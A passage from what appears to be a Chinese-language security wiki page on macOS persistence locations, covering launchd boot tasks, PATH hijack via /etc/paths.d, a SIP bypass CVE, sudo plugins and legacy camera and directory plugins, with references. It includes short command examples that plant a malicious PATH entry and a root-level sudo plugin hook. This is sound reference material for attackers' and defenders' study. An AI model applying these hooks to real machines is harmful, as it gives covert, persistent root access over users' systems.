    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd 启动任务

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- 可用于绕过 sandbox：[🔴](https://emojipedia.org/large-red-circle)（需要 root）
- 需要 root，此外还需要 **SIP bypass**，或者 **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access 权限，具体取决于路径

#### 位置

`launchd` 在其 **`__TEXT,__config`** 段中嵌入一个 plist，用于描述早期“启动任务”。其中几个参考脚本/二进制文件默认**不存在**，攻击者可以创建它们：

- SIP-bypass 集合：**`/Library/Apple/usr/libexec/finish_demo_restore`**、**`/private/var/install/shutdown_installer_tasks`**、**`/private/var/install/deferred_install`**
- TCC/FDA 集合：**`/etc/rc.server`**、**`/etc/rc.cdrom`**、**`/etc/rc.netboot`**（`rc.netboot` 仅在 Sequoia 及更高版本中预先存在）

#### 描述与利用

转储嵌入的任务表，查看 `launchd` 将运行哪些文件以及支持哪些键（`Program`、`ProgramArguments`、`PerformAfterUserspaceReboot`、`RequireSuccess`……）：

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

创建其中一个引用的文件（例如 `/etc/rc.server`）会让 `launchd` 在下一次（用户空间）重启时执行它。最有用的条目受 SIP 限制，或需要 TCC SysAdminFiles/Full Disk Access，因此这是一种需要 root 权限、由重启触发的技术。<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

启动时，`rc.trampoline` 启动任务会运行存储在 `apple-trusted-trampoline` NVRAM 变量中的**平台（Apple 签名）二进制文件**，但**仅当设置了 `rc.trampoline=1` boot-arg 且 SIP 已禁用时**才会运行（大小限制约为 390&nbsp;KB，且必须满足阻塞/快速返回约束）。由于它需要 **root 权限 + 禁用 SIP + Apple 签名的 payload**，因此在现实场景中基本不适用于持久化；此处仅为完整性而列出。<sup>[[41]](#references)</sup>

### /etc/paths 和 /etc/paths.d (PATH hijack)

- 可用于绕过 sandbox：[🔴](https://emojipedia.org/large-red-circle)（需要 root 权限才能写入）
- 需要 root 权限

#### 位置

- **`/etc/paths`** 和 **`/etc/paths.d/*`** — 由 **`path_helper`**（从 `/etc/zprofile` 调用）读取，用于在登录时构建默认 `PATH`。

#### 描述与利用

两者都归 root 所有。通过编辑 `/etc/paths` 或在 `/etc/paths.d/` 中放置文件，将攻击者控制的目录添加到最前面，会使该目录出现在每个新登录 shell 的 `PATH` 前部，因此，一个以常见命令（`ls`、`git` 等）命名的恶意二进制文件会**遮蔽**真实命令，并在受害者下次调用该命令时运行。

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- 可用于 bypass sandbox：[🔴](https://emojipedia.org/large-red-circle)（需要 root）
- 需要 root；结果是 **bypasses SIP**。受影响的 macOS 版本为 **15.0–15.1**，已在 **15.2** 中修复

#### 位置

- 在 **`/Library/Filesystems/`** 中放置一个 filesystem bundle。

#### 描述与利用

`storagekitd` 持有 entitlement **`com.apple.rootless.install.heritable`**，并以**继承**该 SIP-bypassing 能力的方式启动 filesystem bundle 的二进制文件。攻击者通过放置恶意 filesystem bundle，可以运行具备 SIP bypass 能力的代码，以安装**持久化 kernel extensions**，或写入受 SIP 保护的 `LaunchDaemon` 目录——这种持久化能够持续存在，并绕过常规防护。<sup>[[46]](#references)</sup> Apple 已在 macOS Sequoia 15.2 中修复此问题。

### sudo plugins (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- 可用于 bypass sandbox：[🔴](https://emojipedia.org/large-red-circle)（需要 root 才能写入 `/etc/sudo.conf`）
- 安装需要 root；之后，该 plugin 会在**每次 `sudo` 调用时**运行（setuid-root 上下文）

#### 位置

- **`/etc/sudo.conf`** — `Plugin` 行会从 **`/usr/libexec/sudo/`**（或绝对路径）加载 shared objects。默认情况下此文件不存在（sudo 使用内置策略），因此创建该文件即可设置一个干净的 hook。

#### 描述与利用

`sudo` 从 `/etc/sudo.conf` 加载其策略、授权和审计 plugins。由于 `sudo` 是 setuid-root，恶意 shared-object plugin 会在**每次任何用户运行 `sudo` 时**以 **root 权限**执行——这是一种持久的 root 持久化方式，还能看到每条 sudo 命令。<sup>[[51]](#references)</sup> macOS 随附的 sudo 1.9.x 支持 plugin API。

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

文章：[https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
最小示例：[https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Legacy mechanism：**自 macOS 12.3 起已弃用。macOS 14.1 及更高版本默认禁用 legacy video plug-ins。必须先从 Recovery 恢复 legacy video support，此路径才能生效；仅有可写目录并不足够。[Apple 当前的支持指南](https://support.apple.com/en-us/108387)。
- 写入 plug-in 目录需要 root 权限。是否执行代码取决于是否有兼容的客户端仍会加载 DAL plug-ins；此方法未经 macOS 26 runtime 测试。

#### Location

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - 需要 root 权限
  - **触发条件：**恢复 legacy support 后，兼容的 camera client 枚举设备。客户端的 library validation 可能会阻止第三方 plug-in。

#### Description & Exploitation

CoreMediaIO **DAL**（Device Abstraction Layer）plug-ins 会由某些 camera 应用在进程内加载。Apple 的 [camera-extension 演示](https://developer.apple.com/videos/play/wwdc2022/10022/)特别指出，legacy DAL plug-ins **不能**与 FaceTime、QuickTime Player 或 Photo Booth 配合使用，许多其他客户端也会执行 library validation。现代 [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio) 在进程外运行，并采用单独的安装和批准机制。历史上的进程内技术并不意味着它能在当前 macOS 上通用地绕过 Camera TCC。<sup>[[53]](#references)[[54]](#references)</sup>

在 macOS 26 上进行的只读观察：`/Library/CoreMediaIO/Plug-Ins/DAL` 存在且由 root 拥有。未验证 legacy support 是否启用，也未验证任何客户端是否会加载 plug-in。

### Directory Service Plugins

文章：[https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Legacy、有条件的机制：**安装需要 root 权限，并且 plug-in 必须已实际配置并加载。DirectoryService 的 plug-in API 已弃用；在将其视为 boot trigger 之前，请先检查目标 Mac 的 Open Directory 配置。

#### Location

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - 需要 root 权限
  - **触发条件：**Open Directory 需要时，`dspluginhelperd` 会加载符合条件且已配置的 plug-in。[Apple 的 plug-in runtime 指南](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html)指出，未配置为启动时加载的 plug-in，可能会在其节点打开时延迟加载。

#### Description & Exploitation

`dspluginhelperd` 支持 legacy DirectoryService plug-in bundles。如果 legacy plug-in 被接受并激活，恶意 plug-in 就可能成为特权执行路径；这与 PAM 和 Authorization Plugins 不同。目录存在并不能证明新写入的 plug-in 会在下次启动时运行。macOS 26.5 上 Apple 提供的本地 `dspluginhelperd(8)` 和 `opendirectoryd(8)` 手册仍列出了该 helper 和此 legacy 路径。<sup>[[53]](#references)</sup>

在 macOS 26 上进行的只读观察：`/Library/DirectoryServices/PlugIns` 和 `/usr/libexec/dspluginhelperd` 均存在。本次测试未安装、配置或加载任何 plug-in。

## Persistence techniques and tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025：Infostealer 之年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [超越经典 LaunchAgents - 1 - shell 启动文件](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [超越经典 LaunchAgents - 18 - X11 和 XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [超越经典 LaunchAgents - 21 - 重新打开的应用程序](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [超越经典 LaunchAgents - 20 - Terminal 偏好设置](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [超越经典 LaunchAgents - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins（SpecterOps）](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [超越经典 LaunchAgents - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [超越经典 LaunchAgents - 22 - LoginHook 和 LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [超越经典 LaunchAgents - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [超越经典 LaunchAgents - 2 - iTerm2 启动](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [超越经典 LaunchAgents - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [超越经典 LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [超越经典 LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [超越经典 LaunchAgents - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [超越经典 LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [超越经典 LaunchAgents - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [用于 macOS 持久化的 Folder Actions（SpecterOps）](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [超越经典 LaunchAgents - 27 - Dock 快捷方式](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [超越经典 LaunchAgents - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [超越经典 LaunchAgents - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [分析“Mac File Opener”持久化（Objective-See）](https://objective-see.org/blog/blog_0x11.html)
- [23] [超越经典 LaunchAgents - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [保住访问权限：用于 macOS 持久化的屏幕保护程序（SpecterOps）](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [超越经典 LaunchAgents - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [超越经典 LaunchAgents - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [超越经典 LaunchAgents - 19 - Periodic Scripts](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [超越经典 LaunchAgents - 5 - 可插拔认证模块（PAM）](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [超越经典 LaunchAgents - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [利用 Authorization Plugins 持续窃取凭据（SpecterOps）](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [超越经典 LaunchAgents - 30 - man 配置文件 - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [超越经典 LaunchAgents - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [超越经典 LaunchAgents - 31 - BSM 审计框架](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [超越经典 LaunchAgents - 23 - emond，事件监控守护进程](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [超越经典 LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [超越经典 LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [超越经典 LaunchAgents - 10 - 应用程序脚本文件](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [超越经典 LaunchAgents - 32 - Dock Tile Plugins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [超越经典 LaunchAgents - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [超越经典 LaunchAgents - 34 - launchd 启动任务](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [超越经典 LaunchAgents - 35 - 通过 NVRAM 持久化（apple-trusted-trampoline）](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [在 OS X 上使用电子邮件实现持久化（n00py）](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [可疑的 Apple Mail 规则 Plist 修改（Elastic）](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [恶意配置描述文件——Mac 面临的最严重威胁之一（Jamf）](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [《Mac Malware 的艺术》第 1 卷 - 第 0x2 章：持久化（dyld）](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [分析 CVE-2024-44243：通过 kernel extensions 绕过 macOS SIP（Microsoft）](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [通过 Claude Code 项目文件实现 RCE 和 API Token 外泄（CVE-2025-59536，Check Point）](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [GitHub Copilot 和 Cursor 中的新漏洞——Rules 文件后门（Pillar Security）](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - 替代安装方法（External Extensions）](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [在 Mac 上移除 Chrome 中的 ExtensionInstallForcelist（macsecurity.net）](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [编写 Sudo Plugins（sigma-star）](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [通过自定义 URL Schemes 远程利用 Mac（Objective-See）](https://objective-see.org/blog/blog_0x38.html)
- [53] [滥用 Plugins 实现 macOS 持久化的两种技巧（codecolorist）](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DAL 最小示例（johnboiles）](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight：分析一种基于 Spotlight 的 macOS TCC 漏洞（Microsoft）](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python `site` 模块文档（.pth / usercustomize / sitecustomize）](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
